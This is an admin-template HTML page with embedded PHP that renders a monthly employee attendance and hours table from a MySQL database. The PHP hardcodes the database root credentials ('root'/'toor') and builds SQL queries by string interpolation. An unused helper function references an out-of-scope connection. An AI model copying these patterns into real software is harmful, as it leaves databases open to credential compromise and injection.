<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width initial-scale=1.0">
    <title>Adminca bootstrap 4 &amp; angular 5 admin template, Шаблон админки | Datatables</title>
    <!-- GLOBAL MAINLY STYLES-->
    <link href="assets/vendors/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link href="assets/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet" />
    <link href="assets/vendors/line-awesome/css/line-awesome.min.css" rel="stylesheet" />
    <link href="assets/vendors/themify-icons/css/themify-icons.css" rel="stylesheet" />
    <link href="assets/vendors/animate.css/animate.min.css" rel="stylesheet" />
    <link href="assets/vendors/toastr/toastr.min.css" rel="stylesheet" />
    <link href="assets/vendors/bootstrap-select/dist/css/bootstrap-select.min.css" rel="stylesheet" />
    <!-- PLUGINS STYLES-->
    <link href="assets/vendors/dataTables/datatables.min.css" rel="stylesheet" />
    <!-- THEME STYLES-->
    <link href="assets/css/main.min.css" rel="stylesheet" />
	<style rel="stylesheet">
        body {
            font:16px Calibri;
        }
        table {
            border-collapse:separate;
            border-top: 3px solid grey;
        }
        td {
            margin:0;
            border:3px solid grey;
            border-top-width:0px;
            white-space:nowrap;
        }
        #outerdiv {
            position: absolute;
            top: 0;
            left: 0;
            right: 5em;
        }
        #innerdiv {
            width: 100%;
            overflow-x:scroll;
            margin-left: 5em;
            overflow-y:visible;
            padding-bottom:1px;
        }
        .headcol {
            position:absolute;
            width:5em;
            left:0;
            top:auto;
            border-right: 0px none black;
            border-top-width:3px;
            /*only relevant for first row*/
            margin-top:-3px;
            /*compensate for top border*/
        }
        .headcol:before {
            content:'Row ';
        }
        .long {
            background:yellow;
            letter-spacing:1em;
        }
	</style>
	<script>
		
	</script>
    <!-- PAGE LEVEL STYLES-->
</head>

<body>
    <div class="page-wrapper">
        <!-- START HEADER-->
        <header class="header">
            <!-- START TOP-LEFT TOOLBAR-->
            <ul class="nav navbar-toolbar">
                <li>
                    <a class="nav-link sidebar-toggler js-sidebar-toggler" href="javascript:;">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>
                </li>
                <li class="dropdown mega-menu">
                    <a class="nav-link dropdown-toggle" data-toggle="dropdown" href="javascript:;">Mega</a>
                    <div class="dropdown-menu">
                        <div class="dropdown-arrow"></div>
                        <div class="mega-toolbar-menu">
                            <div class="d-flex">
                                <a class="mega-toolbar-item" href="javascript:;">
                                    <div class="item-icon"><i class="ti-file"></i></div>
                                    <div class="item-name">Reports</div>
                                    <div class="item-text">Lorem Ipsum is simply dummy.</div>
                                    <div class="item-details">74 New</div>
                                </a>
                                <a class="mega-toolbar-item" href="javascript:;">
                                    <div class="item-icon"><i class="ti-shopping-cart-full"></i></div>
                                    <div class="item-name">Orders</div>
                                    <div class="item-text">Lorem Ipsum is simply dummy.</div>
                                    <div class="item-details">125 New</div>
                                </a>
                            </div>
                            <div class="d-flex">
                                <a class="mega-toolbar-item" href="javascript:;">
                                    <div class="item-icon"><i class="ti-wallet"></i></div>
                                    <div class="item-name">Profit</div>
                                    <div class="item-text">Lorem Ipsum is simply dummy.</div>
                                    <div class="item-details">+1200<sup>$</sup></div>
                                </a>
                                <a class="mega-toolbar-item" href="javascript:;">
                                    <div class="item-icon"><i class="ti-support"></i></div>
                                    <div class="item-name">Support</div>
                                    <div class="item-text">Lorem Ipsum is simply dummy.</div>
                                    <div class="item-details">54 New Ticket</div>
                                </a>
                            </div>
                        </div>
                    </div>
                </li>
                <li>
                    <a class="nav-link search-toggler js-search-toggler"><i class="ti-search"></i>
                        <span>Search here...</span>
                    </a>
                </li>
            </ul>
            <!-- END TOP-LEFT TOOLBAR-->
            <!--LOGO-->
            <a class="page-brand" href="index.html">A</a>
            <!-- START TOP-RIGHT TOOLBAR-->
            <ul class="nav navbar-toolbar">
                <li class="dropdown dropdown-user">
                    <a class="nav-link dropdown-toggle link" data-toggle="dropdown">
                        <img src="assets/img/users/admin-image.png" alt="image" />
                        <span>Super User</span>
                    </a>
                    <div class="dropdown-menu dropdown-arrow dropdown-menu-right admin-dropdown-menu">
                        <div class="dropdown-arrow"></div>
                        <div class="dropdown-header">
                            <div class="admin-avatar">
                                <img src="assets/img/users/admin-image.png" alt="image" />
                            </div>
                            <div>
                                <h5 class="font-strong text-white">Super User</h5>
                                <div>
                                    <span class="admin-badge mr-3"><i class="ti-alarm-clock mr-2"></i>30m.</span>
                                    <span class="admin-badge"><i class="ti-lock mr-2"></i>Safe Mode</span>
                                </div>
                            </div>
                        </div>
                        <div class="admin-menu-features">
                            <a class="admin-features-item" href="javascript:;"><i class="ti-user"></i>
                                <span>PROFILE</span>
                            </a>
                            <a class="admin-features-item" href="javascript:;"><i class="ti-support"></i>
                                <span>SUPPORT</span>
                            </a>
                            <a class="admin-features-item" href="javascript:;"><i class="ti-settings"></i>
                                <span>SETTINGS</span>
                            </a>
                        </div>
                        <div class="admin-menu-content">
                            <div class="text-muted mb-2">Your Wallet</div>
                            <div><i class="ti-wallet h1 mr-3 text-light"></i>
                                <span class="h1 text-success"><sup>$</sup>12.7k</span>
                            </div>
                            <div class="d-flex justify-content-between mt-2">
                                <a class="text-muted" href="javascript:;">Earnings history</a>
                                <a class="d-flex align-items-center" href="javascript:;">Logout<i class="ti-shift-right ml-2 font-20"></i></a>
                            </div>
                        </div>
                    </div>
                </li>
                <li class="timeout-toggler">
                    <a class="nav-link toolbar-icon" data-toggle="modal" data-target="#session-dialog" href="javascript:;"><i class="ti-alarm-clock timeout-toggler-icon rel"><span class="notify-signal"></span></i></a>
                </li>
                <li class="dropdown dropdown-notification">
                    <a class="nav-link dropdown-toggle toolbar-icon" data-toggle="dropdown" href="javascript:;"><i class="ti-bell rel"><span class="notify-signal"></span></i></a>
                    <div class="dropdown-menu dropdown-menu-right dropdown-menu-media">
                        <div class="dropdown-arrow"></div>
                        <div class="dropdown-header text-center">
                            <div>
                                <span class="font-18"><strong>14 New</strong> Notifications</span>
                            </div>
                            <a class="text-muted font-13" href="javascript:;">view all</a>
                        </div>
                        <div class="p-3">
                            <ul class="timeline scroller" data-height="320px">
                                <li class="timeline-item"><i class="ti-check timeline-icon"></i>2 Issue fixed<small class="float-right text-muted ml-2 nowrap">Just now</small></li>
                                <li class="timeline-item"><i class="ti-announcement timeline-icon"></i>
                                    <span>7 new feedback
                                        <span class="badge badge-warning badge-pill ml-2">important</span>
                                    </span><small class="float-right text-muted">5 mins</small></li>
                                <li class="timeline-item"><i class="ti-truck timeline-icon"></i>25 new orders sent<small class="float-right text-muted ml-2 nowrap">24 mins</small></li>
                                <li class="timeline-item"><i class="ti-shopping-cart timeline-icon"></i>12 New orders<small class="float-right text-muted ml-2 nowrap">45 mins</small></li>
                                <li class="timeline-item"><i class="ti-user timeline-icon"></i>18 new users registered<small class="float-right text-muted ml-2 nowrap">1 hrs</small></li>
                                <li class="timeline-item"><i class="ti-harddrives timeline-icon"></i>
                                    <span>Server Error
                                        <span class="badge badge-success badge-pill ml-2">resolved</span>
                                    </span><small class="float-right text-muted">2 hrs</small></li>
                                <li class="timeline-item"><i class="ti-info-alt timeline-icon"></i>
                                    <span>System Warning
                                        <a class="text-purple ml-2">Check</a>
                                    </span><small class="float-right text-muted ml-2 nowrap">12:07</small></li>
                                <li class="timeline-item"><i class="fa fa-file-excel-o timeline-icon"></i>The invoice is ready<small class="float-right text-muted ml-2 nowrap">12:30</small></li>
                                <li class="timeline-item"><i class="ti-shopping-cart timeline-icon"></i>5 New Orders<small class="float-right text-muted ml-2 nowrap">13:45</small></li>
                                <li class="timeline-item"><i class="ti-arrow-circle-up timeline-icon"></i>Production server up<small class="float-right text-muted ml-2 nowrap">1 days ago</small></li>
                                <li class="timeline-item"><i class="ti-harddrives timeline-icon"></i>Server overloaded 91%<small class="float-right text-muted ml-2 nowrap">2 days ago</small></li>
                                <li class="timeline-item"><i class="ti-info-alt timeline-icon"></i>Server error<small class="float-right text-muted ml-2 nowrap">2 days ago</small></li>
                            </ul>
                        </div>
                    </div>
                </li>
                <li>
                    <a class="nav-link quick-sidebar-toggler">
                        <span class="ti-align-right"></span>
                    </a>
                </li>
            </ul>
            <!-- END TOP-RIGHT TOOLBAR-->
        </header>
        <!-- END HEADER-->
        <!-- START SIDEBAR-->
        <nav class="page-sidebar">
            <ul class="side-menu metismenu scroller">
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-home"></i>
                        <span class="nav-label">Dashboards</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="index.html">Visitors</a>
                        </li>
                        <li>
                            <a href="dashboard_ecommerce.html">Shop</a>
                        </li>
                        <li>
                            <a href="dashboard_blog.html">Blog</a>
                        </li>
                        <li>
                            <a href="dashboard_4.html">Dashboard v4</a>
                        </li>
                        <li>
                            <a href="dashboard_5.html">Dashboard v5</a>
                        </li>
                        <li>
                            <a href="dashboard_6.html">Dashboard v6</a>
                        </li>
                        <li>
                            <a href="dashboard_7.html">Dashboard v7</a>
                        </li>
                    </ul>
                </li>
                <li class="heading">FEATURES</li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-paint-roller"></i>
                        <span class="nav-label">Basic UI</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="colors.html">Colors</a>
                        </li>
                        <li>
                            <a href="typography.html">Typography</a>
                        </li>
                        <li>
                            <a href="panels.html">Panels</a>
                        </li>
                        <li>
                            <a href="javascript:;">
                                <span class="nav-label">Tabs</span><i class="fa fa-angle-left arrow"></i></a>
                            <ul class="nav-3-level collapse">
                                <li>
                                    <a href="tabs-pill.html">Pills</a>
                                </li>
                                <li>
                                    <a href="tabs-line.html">Line tabs</a>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <a href="alerts.html">Alerts</a>
                        </li>
                        <li>
                            <a href="tooltip_popover.html">Tooltip &amp; Popover</a>
                        </li>
                        <li>
                            <a href="badges_progress.html">Badges &amp; Progress</a>
                        </li>
                        <li>
                            <a href="lists.html">List</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-package"></i>
                        <span class="nav-label">Components</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="toastr.html">Toastr Notifications</a>
                        </li>
                        <li>
                            <a href="sweetalert.html">Sweet Alert</a>
                        </li>
                        <li>
                            <a href="alertify.html">Alertify</a>
                        </li>
                        <li>
                            <a href="idle_timer.html">Idle timer</a>
                        </li>
                        <li>
                            <a href="session_timeout.html">Session Timeout</a>
                        </li>
                        <li>
                            <a href="code_editor.html">Code Editor</a>
                        </li>
                        <li>
                            <a href="tree_view.html">Tree View</a>
                        </li>
                        <li>
                            <a href="nestable.html">Nestable List</a>
                        </li>
                        <li>
                            <a href="clipboard.html">Clipboard</a>
                        </li>
                        <li>
                            <a href="masonry.html">Masonry</a>
                        </li>
                        <li>
                            <a href="pdf_viewer.html">PDF viewer</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-heart"></i>
                        <span class="nav-label">Buttons</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="javascript:;">
                                <span class="nav-label">Base Buttons</span><i class="fa fa-angle-left arrow"></i></a>
                            <ul class="nav-3-level collapse">
                                <li>
                                    <a href="buttons-default.html">Default style</a>
                                </li>
                                <li>
                                    <a href="buttons-rounded.html">Rounded style</a>
                                </li>
                                <li>
                                    <a href="buttons-square.html">Square style</a>
                                </li>
                                <li>
                                    <a href="buttons-air.html">Air style</a>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <a href="button-icon.html">Button Icon</a>
                        </li>
                        <li>
                            <a href="button-labeled.html">Labeled buttons</a>
                        </li>
                        <li>
                            <a href="button-animated.html">Animated buttons</a>
                        </li>
                        <li>
                            <a href="buttons-fab.html">FAB buttons</a>
                        </li>
                        <li>
                            <a href="button-groups.html">Button Groups</a>
                        </li>
                        <li>
                            <a href="button-dropdowns.html">Button dropdowns</a>
                        </li>
                        <li>
                            <a href="buttons-social.html">Social Buttons</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-layers-alt"></i>
                        <span class="nav-label">Widgets</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="widgets-statistics.html">Statistics Widgets</a>
                        </li>
                        <li>
                            <a href="widgets-list.html">App &amp; List Widgets</a>
                        </li>
                        <li>
                            <a href="widgets-user.html">User Widgets</a>
                        </li>
                        <li>
                            <a href="widgets-blog.html">Blog Widgets</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-check-box"></i>
                        <span class="nav-label">Forms</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="javascript:;">
                                <span class="nav-label">Form Controls</span><i class="fa fa-angle-left arrow"></i></a>
                            <ul class="nav-3-level collapse">
                                <li>
                                    <a href="form-controls.html">Inputs</a>
                                </li>
                                <li>
                                    <a href="form-switch.html">Switch</a>
                                </li>
                                <li>
                                    <a href="form-checkbox-radio.html">Checkbox &amp; Radio</a>
                                </li>
                                <li>
                                    <a href="form-input-groups.html">Input Groups</a>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <a href="form_layouts.html">Form Layouts</a>
                        </li>
                        <li>
                            <a href="form_advanced.html">Advanced Plugins</a>
                        </li>
                        <li>
                            <a href="form_masks.html">Form input masks</a>
                        </li>
                        <li>
                            <a href="form_validation.html">Form Validation</a>
                        </li>
                        <li>
                            <a href="text_editors.html">Text Editors</a>
                        </li>
                        <li>
                            <a href="form_dropzone.html">Dropzone File Upload</a>
                        </li>
                        <li>
                            <a href="image_cropping.html">Image Cropping</a>
                        </li>
                        <li>
                            <a href="autocomplete.html">Autocomplete</a>
                        </li>
                        <li>
                            <a href="form_wizard.html">Form Wizard</a>
                        </li>
                    </ul>
                </li>
                <li class="active">
                    <a href="javascript:;"><i class="sidebar-item-icon ti-layout-tab-window"></i>
                        <span class="nav-label">Tables</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse in">
                        <li>
                            <a href="table_basic.html">Basic Tables</a>
                        </li>
                        <li>
                            <a class="active" href="datatables.html">Datatables</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-bar-chart"></i>
                        <span class="nav-label">Charts</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="charts_flot.html">Flot Charts</a>
                        </li>
                        <li>
                            <a href="charts_morris.html">Morris Charts</a>
                        </li>
                        <li>
                            <a href="chartjs.html">Chart.js</a>
                        </li>
                        <li>
                            <a href="c3.html">C3 Charts</a>
                        </li>
                        <li>
                            <a href="charts_peity.html">Peity Charts</a>
                        </li>
                        <li>
                            <a href="charts_sparkline.html">Sparkline Charts</a>
                        </li>
                        <li>
                            <a href="charts_rickshaw.html">Rickshaw Charts</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-map-alt"></i>
                        <span class="nav-label">Maps</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="maps_google.html">Google maps</a>
                        </li>
                        <li>
                            <a href="datamaps.html">Datamaps</a>
                        </li>
                        <li>
                            <a href="maps_vector.html">Vector maps</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="icons.html"><i class="sidebar-item-icon ti-comments-smiley"></i>
                        <span class="nav-label">Icons</span>
                    </a>
                </li>
                <li class="heading">PAGES</li>
                <li>
                    <a href="mailbox.html"><i class="sidebar-item-icon ti-email"></i>
                        <span class="nav-label">Mailbox</span>
                    </a>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-pencil"></i>
                        <span class="nav-label">Blog</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="blog_list.html">List</a>
                        </li>
                        <li>
                            <a href="article.html">Article</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-shopping-cart"></i>
                        <span class="nav-label">E-Commerce</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="dashboard_ecommerce.html">Dashboard</a>
                        </li>
                        <li>
                            <a href="ecommerce_products_list.html">Products list</a>
                        </li>
                        <li>
                            <a href="ecommerce_add_product.html">Add new product</a>
                        </li>
                        <li>
                            <a href="ecommerce_orders_list.html">Orders list</a>
                        </li>
                        <li>
                            <a href="ecommerce_order_details.html">Order details</a>
                        </li>
                        <li>
                            <a href="invoice.html">Invoice</a>
                        </li>
                        <li>
                            <a href="ecommerce_customers.html">Customers</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="calendar.html"><i class="sidebar-item-icon ti-calendar"></i>
                        <span class="nav-label">Calendar</span>
                    </a>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-files"></i>
                        <span class="nav-label">General Pages</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="faq.html">FAQ</a>
                        </li>
                        <li>
                            <a href="search.html">Search</a>
                        </li>
                        <li>
                            <a href="timeline.html">Timeline</a>
                        </li>
                        <li>
                            <a href="timeline_horizontal.html">Horizontal timeline</a>
                        </li>
                        <li>
                            <a href="pricing-table-1.html">Pricing Table v1</a>
                        </li>
                        <li>
                            <a href="pricing-table-2.html">Pricing Table v2</a>
                        </li>
                        <li>
                            <a href="pricing-table-3.html">Pricing Table v3</a>
                        </li>
                        <li>
                            <a href="pricing-table-4.html">Pricing Table v4</a>
                        </li>
                        <li>
                            <a href="pricing-table-5.html">Pricing Table v5</a>
                        </li>
                        <li>
                            <a href="pricing-table-6.html">Pricing Table v6</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-user"></i>
                        <span class="nav-label">Custom Pages</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="javascript:;">
                                <span class="nav-label">User Pages</span><i class="fa fa-angle-left arrow"></i></a>
                            <ul class="nav-3-level collapse">
                                <li>
                                    <a href="profile.html">Profile</a>
                                </li>
                                <li>
                                    <a href="login.html">Login v1</a>
                                </li>
                                <li>
                                    <a href="login-2.html">Login v2</a>
                                </li>
                                <li>
                                    <a href="login-3.html">Login v3</a>
                                </li>
                                <li>
                                    <a href="login-4.html">Login v4</a>
                                </li>
                                <li>
                                    <a href="login-5.html">Login v5</a>
                                </li>
                                <li>
                                    <a href="lockscreen.html">Lockscreen</a>
                                </li>
                                <li>
                                    <a href="forgot_password.html">Forgot password</a>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <a href="javascript:;">
                                <span class="nav-label">Error Pages</span><i class="fa fa-angle-left arrow"></i></a>
                            <ul class="nav-3-level collapse">
                                <li>
                                    <a href="error_404.html">404 error</a>
                                </li>
                                <li>
                                    <a href="error_404-2.html">404 error v2</a>
                                </li>
                                <li>
                                    <a href="error_403.html">403 error</a>
                                </li>
                                <li>
                                    <a href="error_500.html">500 error</a>
                                </li>
                                <li>
                                    <a href="maintenance.html">Maintenance Mode</a>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="javascript:;"><i class="sidebar-item-icon ti-anchor"></i>
                        <span class="nav-label">Menu Levels</span><i class="fa fa-angle-left arrow"></i></a>
                    <ul class="nav-2-level collapse">
                        <li>
                            <a href="javascript:;">Level 2</a>
                        </li>
                        <li>
                            <a href="javascript:;">
                                <span class="nav-label">Level 2</span><i class="fa fa-angle-left arrow"></i></a>
                            <ul class="nav-3-level collapse">
                                <li>
                                    <a href="javascript:;">Level 3</a>
                                </li>
                                <li>
                                    <a href="javascript:;">Level 3</a>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </li>
            </ul>
        </nav>
        <!-- END SIDEBAR-->
        <div class="content-wrapper">
			<!-- BEGIN PAGA BACKDROPS-->
			<div class="sidenav-backdrop backdrop"></div>
			<div class="preloader-backdrop">
				<div class="page-preloader">Loading</div>
			</div>
			<!-- END PAGA BACKDROPS-->
            <!-- START PAGE CONTENT-->
            <div class="page-heading">
                <h1 class="page-title">Datatables</h1>
                <ol class="breadcrumb">
                    <li class="breadcrumb-item">
                        <a href="index.html"><i class="la la-home font-20"></i></a>
                    </li>
                    <li class="breadcrumb-item">Tables</li>
                    <li class="breadcrumb-item">Datatables</li>
                </ol>
            </div>
            <div class="page-content fade-in-up">
                <div class="ibox">
                    <div class="ibox-body">
                        <h5 class="font-strong mb-4">DATATABLE</h5>
                        <div class="flexbox mb-4">
                            <div class="flexbox">
                                <label class="mb-0 mr-2">Type:</label>
                                <select class="selectpicker show-tick form-control" id="type-filter" title="Please select" data-style="btn-solid" data-width="150px">
                                    <option value="">All</option>
                                    <option>Shipped</option>
                                    <option>Completed</option>
                                    <option>Pending</option>
                                    <option>Canceled</option>
                                </select>
                            </div>
                            <div class="input-group-icon input-group-icon-left mr-3">
                                <span class="input-icon input-icon-right font-16"><i class="ti-search"></i></span>
                                <input class="form-control form-control-rounded form-control-solid" id="key-search" type="text" placeholder="Search ...">
                            </div>
                        </div>
                        <div class="table-responsive row" style='overflow-x: auto;'>
						<div>
<?php 
	$start = '2018-04-01';
	$end = '2018-04-30';
	$db 	= mysqli_connect('localhost', 'root', 'toor', 'ci_fp');
	//$get 	= mysqli_query($db,"SELECT code,name FROM employee WHERE code between '2090' and '2200' order by code asc LIMIT 0,30");
	$get 	= mysqli_query($db,"SELECT code,name FROM employee order by code asc  LIMIT 0,20");
	$datediff = strtotime($end) - strtotime($start);
	$datediff = floor($datediff/(60*60*24));
	
	function get_masuk($code,$true){
		$queries 	= "SELECT date_time FROM data_absen where pin = '$code' and tgl = '$true' and status = 0 LIMIT 1";
		$get_code 	= mysqli_query($db,$queries);
		$klo 		= mysqli_fetch_array($get_code);
		echo '<td>'.$klo['date_time'].'</td>'; 
		
		
	}

	function differenceInHours($startdate,$enddate){
	$starttimestamp = strtotime($startdate);
	$endtimestamp = strtotime($enddate);
	$difference = abs($endtimestamp - $starttimestamp)/3600;
	return $difference;
}
	echo '<table class="table table-bordered table-hover" id="datatable">';
	echo "<tr>";
		echo "<th colspan=3>";
			echo 'Day';
		echo "</th>";
		for($i = 0; $i < $datediff + 1; $i++)
		{
			echo '<th>'.date("w", strtotime($start . ' + ' . $i . 'day')) .'</th>'; 
		}
	echo "</tr>";
	echo "<tr>";
		echo "<th colspan=3>";
			echo 'Day';
		echo "</th>";
		for($i = 0; $i < $datediff + 1; $i++)
		{
			echo '<th>'.date("D", strtotime($start . ' + ' . $i . 'day')) .'</th>'; 
		}
	echo "</tr>";
	
	echo "<tr>";
	echo "<th>";
		echo 'No';
	echo "</th>";
	echo "<th>";
		echo 'NIK';
	echo "</th>";
	echo "<th style='padding:8px 70px'>";
		echo 'PABRIK';
	echo "</th>";
	
	
	
	for($i = 0; $i < $datediff + 1; $i++)
	{
		
		echo '<th>'.date("m/d", strtotime($start . ' + ' . $i . 'day')) .'</th>'; 
	}
	echo "</tr>";
	$x = 1;
	while($data = mysqli_fetch_array($get))
	{
		echo "<tr style='overflow: visible;'>";
			echo "<td>";
				echo $x;
			echo "</td>";
			echo "<td>";
				echo $code = $data['code'];
			echo "</td>";
			echo "<td>";
				echo $data['name'];
				
				for($i = 0; $i < $datediff + 1; $i++)
				{
					
					$true 		= date("Y/m/d", strtotime($start . ' + ' . $i . 'day'));
					$queries 	= "SELECT date_time FROM data_absen where pin = '$code' and tgl = '$true' and status = 0 LIMIT 1";
					$get_code 	= mysqli_query($db,$queries);
					$klo 		= mysqli_fetch_array($get_code);
					
					$queries2 	= "SELECT date_time FROM data_absen where pin = '$code' and tgl = '$true' and status = 1 LIMIT 1";
					$get_code2 	= mysqli_query($db,$queries2);
					$klo2 		= mysqli_fetch_array($get_code2);
					
					$datetime1 = strtotime($klo['date_time']);
					$datetime2 = strtotime($klo2['date_time']);
					
					
					$datetime1 = new DateTime($klo['date_time']);
					$datetime2 = new DateTime($klo2['date_time']);
					
					$interval = $datetime1->diff($datetime2);
					

					echo '<td>';
					$masuk = $klo['date_time']; 
					if($masuk == NULL){
						echo '0';
					}else
						
						echo $interval->format('%H,%i');
						//echo date("H:i:s", strtotime($klo['date_time']));
					echo '</td>'; 
					//echo '<td>'.date("m/d", strtotime($start . ' + ' . $i . 'day')) .'</td>'; 
				}
				
				
				
			echo "</td>";
			$x++;
		echo "</tr>";
		
		
	
	} 

	echo "</table>";

?>			</div>
            </div>
                    </div>
                </div>
            </div>
            <!-- END PAGE CONTENT-->
            <footer class="page-footer">
                <div class="font-13">2018 © <b>PT Megah Sembada Industries</b></div>
                <div>
                   
                </div>
                <div class="to-top"><i class="fa fa-angle-double-up"></i></div>
            </footer>
        </div>
    </div>
    <!-- START SEARCH PANEL-->
    <form class="search-top-bar" action="http://admincast.com/adminca/preview/admin_7/html/search.html">
        <input class="form-control search-input" type="text" placeholder="Search...">
        <button class="reset input-search-icon"><i class="ti-search"></i></button>
        <button class="reset input-search-close" type="button"><i class="ti-close"></i></button>
    </form>
    <!-- END SEARCH PANEL-->

    
    <!-- New question dialog-->
    <div class="modal fade" id="session-dialog">
        <div class="modal-dialog" style="width:400px;" role="document">
            <div class="modal-content timeout-modal">
                <div class="modal-body">
                    <button class="close" data-dismiss="modal" aria-label="Close"></button>
                    <div class="text-center mt-3 mb-4"><i class="ti-lock timeout-icon"></i></div>
                    <div class="text-center h4 mb-3">Set Auto Logout</div>
                    <p class="text-center mb-4">You are about to be signed out due to inactivity.<br>Select after how many minutes of inactivity you log out of the system.</p>
                    <div id="timeout-reset-box" style="display:none;">
                        <div class="form-group text-center">
                            <button class="btn btn-danger btn-fix btn-air" id="timeout-reset">Deactivate</button>
                        </div>
                    </div>
                    <div id="timeout-activate-box">
                        <form id="timeout-form" action="javascript:;">
                            <div class="form-group pl-3 pr-3 mb-4">
                                <input class="form-control form-control-line" type="text" name="timeout_count" placeholder="Minutes" id="timeout-count">
                            </div>
                            <div class="form-group text-center">
                                <button class="btn btn-primary btn-fix btn-air" id="timeout-activate">Activate</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- End New question dialog-->
    <!-- QUICK SIDEBAR-->
    <div class="quick-sidebar">
        <ul class="nav nav-tabs tabs-line">
            <li class="nav-item">
                <a class="nav-link active" href="#tab-1" data-toggle="tab"><i class="ti-comment"></i>
                    <div>Messages</div>
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#tab-2" data-toggle="tab"><i class="ti-settings"></i>
                    <div>Settings</div>
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#tab-3" data-toggle="tab"><i class="ti-notepad"></i>
                    <div>Logs</div>
                </a>
            </li>
        </ul>

    </div>
    <!-- END QUICK SIDEBAR-->
    <!-- CORE PLUGINS-->
    <script src="assets/vendors/jquery/dist/jquery.min.js"></script>
    <script src="assets/vendors/popper.js/dist/umd/popper.min.js"></script>
    <script src="assets/vendors/bootstrap/dist/js/bootstrap.min.js"></script>
    <script src="assets/vendors/metisMenu/dist/metisMenu.min.js"></script>
    <script src="assets/vendors/jquery-slimscroll/jquery.slimscroll.min.js"></script>
    <script src="assets/vendors/jquery-idletimer/dist/idle-timer.min.js"></script>
    <script src="assets/vendors/toastr/toastr.min.js"></script>
    <script src="assets/vendors/jquery-validation/dist/jquery.validate.min.js"></script>
    <script src="assets/vendors/bootstrap-select/dist/js/bootstrap-select.min.js"></script>
    <!-- PAGE LEVEL PLUGINS-->
    <script src="assets/vendors/dataTables/datatables.min.js"></script>
    <!-- CORE SCRIPTS-->
    <script src="assets/js/app.min.js"></script>
    <!-- PAGE LEVEL SCRIPTS-->
    <script>
        $(function() {
            $('#datatable').DataTable({
                pageLength: 10,
                fixedHeader: true,
                responsive: true,
                "sDom": 'rtip',
                columnDefs: [{
                    targets: 'no-sort',
                    orderable: false
                }]
            });

            var table = $('#datatable').DataTable();
            $('#key-search').on('keyup', function() {
                table.search(this.value).draw();
            });
            $('#type-filter').on('change', function() {
                table.column(4).search($(this).val()).draw();
            });
        });
    </script>
